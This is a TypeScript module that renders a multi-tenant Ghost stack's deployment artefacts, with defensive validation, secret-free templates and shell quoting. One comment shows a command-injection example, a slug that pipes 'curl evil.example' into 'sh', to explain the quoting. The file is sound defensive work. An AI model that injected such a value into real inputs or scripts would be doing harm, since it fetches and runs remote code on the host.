/**
 * The descriptor-to-artefacts render step: pure and total, same seven
 * artefacts from the same functions for every kind and both reconcilers.
 * Performs no I/O. No secret ever appears in an artefact. See
 * render.md#render-step-overview for the artefact list and a known
 * Done-criterion conflict.
 */

import {
  validateDigestPinnedRef,
  validatePort,
  validatePrivateIpV4,
  validateSlug,
  validateTenantUid,
} from './brand.js';
import { renderComposeStack, type DemoDataMount } from './compose.js';
import type { TenantDescriptor } from './descriptor.js';
import { renderEdgeSiteBlock, THEME_CSP_UNAVAILABLE, type ThemeCsp } from './edge.js';
import { tenantEnvironment, SECRET_ENV_KEYS } from './environment.js';
import { renderIdentity } from './identity.js';
import { imageEnvPath, secretsEnvPath, stackName, validateSlugAvailability } from './naming.js';
import { uploadLimits } from './runtime.js';
import { renderSettings } from './settings.js';
import type { ZoneConfig } from './validate.js';
import { FieldValidationError } from './brand.js';

/** One file a caller writes into a slot's (or a tenant's) own directory —
 * matches `services/broker/src/render.ts`'s `Artefact` shape structurally,
 * without this package importing it (the dependency-closure rule runs the
 * other way: consumers depend on `render-core`, never the reverse). */
export interface Artefact {
  readonly path: string;
  readonly content: string;
  /** Octal file mode; a consumer that omits it defaults to owner-only. */
  readonly mode?: number;
}

const SECRETS_ENV_MODE = 0o600;
const REQUIRED_SECRET_KEYS: Record<'sqlite' | 'mysql', readonly string[]> = {
  sqlite: [],
  mysql: [SECRET_ENV_KEYS.databasePassword],
};

function requiredSecretKeys(descriptor: TenantDescriptor): string[] {
  const keys: string[] = [...REQUIRED_SECRET_KEYS[descriptor.database.kind]];
  if (descriptor.media.kind === 's3') {
    keys.push(SECRET_ENV_KEYS.s3AccessKeyId, SECRET_ENV_KEYS.s3SecretAccessKey);
  }
  if (descriptor.transport.kind === 'smtp') {
    keys.push(SECRET_ENV_KEYS.mailPassword);
  }
  if (descriptor.mail.enabled) {
    keys.push(SECRET_ENV_KEYS.bulkEmailApiKey);
  }
  return keys;
}

/**
 * A template naming which secrets this descriptor's kind needs, never their
 * values — `render()` has no secret to put here even if it wanted to (see
 * the module doc comment). A demo (`sqlite` + `local`) needs none, so its
 * template carries only the header comment.
 */
export function renderSecretsTemplate(descriptor: TenantDescriptor): string {
  const path = secretsEnvPath(descriptor.slug);
  const keys = requiredSecretKeys(descriptor);
  const lines = [
    `# Secrets for the ${descriptor.slug} Ghost stack, at ${path}.`,
    '# Root-owned, mode 0600. Written by an operator; no automated path may',
    '# rewrite this file. render() names the keys this tenant needs below —',
    '# it never has a value to put here.',
  ];
  if (keys.length === 0) {
    lines.push('# This tenant needs no secret: sqlite + local media + queue transport.');
  } else {
    for (const key of keys) {
      lines.push(`${key}=`);
    }
  }
  return `${lines.join('\n')}\n`;
}

// eslint-disable-next-line no-control-regex -- refusing control characters is the point
const CONTROL_CHARACTER = /[\u0000-\u001f\u007f-\u009f]/;

/**
 * `validateDigestPinnedRef`'s own pattern is anchored `^…$`, but JavaScript's
 * `$` (without the `m` flag) matches immediately before one *trailing*
 * newline as well as end-of-string — so `"<ref>\n"` passes it. A second,
 * explicit control-character refusal here is what closes that: a newline
 * in `IMAGE=<value>` would otherwise start a second `EnvironmentFile`
 * variable systemd reads as if this tenant had declared it.
 */
function renderImageEnv(descriptor: TenantDescriptor): string {
  if (CONTROL_CHARACTER.test(descriptor.image)) {
    throw new FieldValidationError(
      'image',
      'image must not contain a control character — a trailing newline would start a second ' +
        'EnvironmentFile variable.'
    );
  }
  return `IMAGE=${descriptor.image}\n`;
}

// POSIX single-quote escaping: closes the quote, emits an escaped literal
// quote, reopens it. Every value interpolated into provision.sh goes
// through this: an unquoted slug such as `demo-1; curl evil.example | sh #`
// would otherwise reach the script's argv as shell syntax rather than as
// one argument.
function shellQuote(value: string): string {
  return `'${value.replaceAll("'", `'\\''`)}'`;
}

/**
 * The exact root-run command that must create a paying tenant's two named
 * volumes, owned to its uid, before its unit can start. A demo renders no
 * equivalent command. See render.md#provision-script.
 */
function renderProvisionScript(descriptor: TenantDescriptor): string {
  const lines = ['#!/bin/sh', 'set -eu'];
  if (descriptor.kind === 'demo') {
    lines.push(
      `# ${descriptor.slug}'s slot data directory is host-provisioned once, at demo-host`,
      '# build time (LLD-2 §01) -- there is nothing for this script to do per recycle.'
    );
  } else {
    lines.push(
      `# Provisions ${descriptor.slug}'s two named volumes before ${stackName(descriptor.slug)}'s`,
      '# unit is enabled. Idempotent; safe to re-run.',
      `/root/platform-provision/provision_tenant_volume.py --uid ${shellQuote(String(descriptor.uid))} ${shellQuote(descriptor.slug)}`
    );
  }
  return `${lines.join('\n')}\n`;
}

function renderJson(value: unknown): string {
  return `${JSON.stringify(value, null, 2)}\n`;
}

// A pure, dependency-closure-safe stand-in for `node:path`'s `dirname` —
// POSIX-only (every path this package renders is a container path), and
// deliberately narrow: it is never handed a path without at least one `/`,
// because `assertDemoDataPaths` below checks that first.
function dirname(path: string): string {
  const lastSlash = path.lastIndexOf('/');
  return lastSlash <= 0 ? '/' : path.slice(0, lastSlash);
}

/**
 * The demo data mount `compose.ts` needs: both `database.path` (the SQLite
 * file) and `media.path` (the local media directory) must resolve under
 * one common parent, because a demo gets exactly one host-provisioned
 * directory (LLD-2 §01, load-bearing: "one directory") to mount there —
 * not one volume per path. Named by `uid` (the stable per-slot identity),
 * never `slug` — see `compose.ts`'s own `DemoDataMount` doc comment.
 */
function demoDataMount(descriptor: TenantDescriptor): DemoDataMount | null {
  if (descriptor.database.kind !== 'sqlite' || descriptor.media.kind !== 'local') {
    return null;
  }
  const dataDir = dirname(descriptor.database.path);
  if (descriptor.media.path !== dataDir && !descriptor.media.path.startsWith(`${dataDir}/`)) {
    throw new FieldValidationError(
      'media.path',
      `media.path "${descriptor.media.path}" must be database.path's own parent directory ` +
        `("${dataDir}") or a subdirectory of it — a demo mounts one host-provisioned directory ` +
        `for both, per LLD-2 §01's "one directory".`
    );
  }
  return { volumeName: `ghost-demo-${descriptor.uid}-data`, path: dataDir };
}

/**
 * Re-checks the fields the broker's own reconcile handler already guards,
 * plus the two fields interpolated into shell and env file text, so this
 * function is safe to call directly by a caller with no `validate()` of its
 * own. See render.md#assertallocationshape.
 */
function assertAllocationShape(descriptor: TenantDescriptor): void {
  validateTenantUid(descriptor.uid);
  validatePort(descriptor.ports.a, 'ports.a');
  validatePort(descriptor.ports.b, 'ports.b');
  validatePort(descriptor.ports.health, 'ports.health');
  validatePrivateIpV4(descriptor.appHostIp);
  validateSlug(descriptor.slug);
  validateSlugAvailability(descriptor.slug);
  validateDigestPinnedRef(descriptor.image);
}

/**
 * `descriptor` must already have passed `validate()` — `render()` does not
 * re-run it, but does re-check every field it interpolates into shell, env
 * or Compose text directly, via `assertAllocationShape`. Returns the seven
 * artefacts directly. See render.md#render.
 */
export function render(
  descriptor: TenantDescriptor,
  zones: ZoneConfig,
  themeCsp: ThemeCsp = THEME_CSP_UNAVAILABLE
): readonly Artefact[] {
  assertAllocationShape(descriptor);
  const dataMount = demoDataMount(descriptor);

  const limits = uploadLimits();
  const environment = tenantEnvironment(descriptor, limits, secretsEnvPath(descriptor.slug), zones);
  const compose = renderComposeStack({
    kind: descriptor.kind,
    slug: descriptor.slug,
    uid: descriptor.uid,
    appHostPrivateIp: descriptor.appHostIp,
    ports: descriptor.ports,
    environment,
    limits,
    caps: descriptor.caps,
    dataMount,
  });
  const edge = renderEdgeSiteBlock(descriptor, zones, limits, themeCsp);
  const settings = renderSettings(descriptor, zones);
  const identity = renderIdentity(descriptor);

  return [
    { path: 'compose.yml', content: compose, mode: 0o644 },
    { path: 'secrets.env', content: renderSecretsTemplate(descriptor), mode: SECRETS_ENV_MODE },
    { path: 'image.env', content: renderImageEnv(descriptor), mode: 0o644 },
    { path: 'provision.sh', content: renderProvisionScript(descriptor), mode: 0o700 },
    { path: 'edge.json', content: renderJson(edge), mode: 0o644 },
    { path: 'ghost-settings.json', content: renderJson(settings), mode: 0o644 },
    { path: 'identity.json', content: renderJson(identity), mode: 0o644 },
  ];
}

export { imageEnvPath, renderEdgeSiteBlock, renderSettings, renderIdentity };
export { validateScriptHash, THEME_CSP_UNAVAILABLE } from './edge.js';
export type { EdgeGate, EdgeSiteBlock, ScriptHash, ThemeCsp } from './edge.js';
export type { GhostSettings, CodeInjectionSettings } from './settings.js';
export type { TenantIdentity } from './identity.js';
